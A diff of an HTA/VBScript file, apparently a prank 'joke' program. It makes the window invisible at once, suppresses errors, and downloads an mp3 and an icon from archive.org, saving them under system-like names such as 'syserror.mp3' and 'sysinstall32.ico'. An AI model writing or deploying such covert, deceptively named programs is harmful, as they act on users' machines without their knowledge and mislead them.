@@ -35,7 +35,12 @@
     dim bStrm: Set bStrm = createobject("Adodb.Stream")
     strUser = CreateObject("WScript.Network").UserName
 
+    Rem Makes windows uber small and moves it far away
+    window.moveTo 999999,999999
+    window.resizeTo 0,0
+    
     Rem Download some things
+    On Error Resume Next
     xHttp.Open "GET", "https://ia801409.us.archive.org/12/items/rebeccablackfriday_202010/Joke.mp3", False
     xHttp.Send
     With bStrm
@@ -45,6 +50,7 @@
         .savetofile WshShell.CurrentDirectory & "\syserror.mp3", 2
     End With
 
+    On Error Resume Next
     xHttp.Open "GET", "https://ia801400.us.archive.org/32/items/Dll_Icon/Joke.ico", False
     xHttp.Send
     With bStrm
@@ -53,10 +59,6 @@
         .write xHttp.responseBody
         .savetofile WshShell.CurrentDirectory & "\sysinstall32.ico", 2
     End With
-
-    Rem Makes windows uber small and moves it far away
-    window.moveTo 999999,999999
-    window.resizeTo 0,0
     
     Rem Functions and Initialization
     Rem Wait function since the sleep function doesn't work in HTA
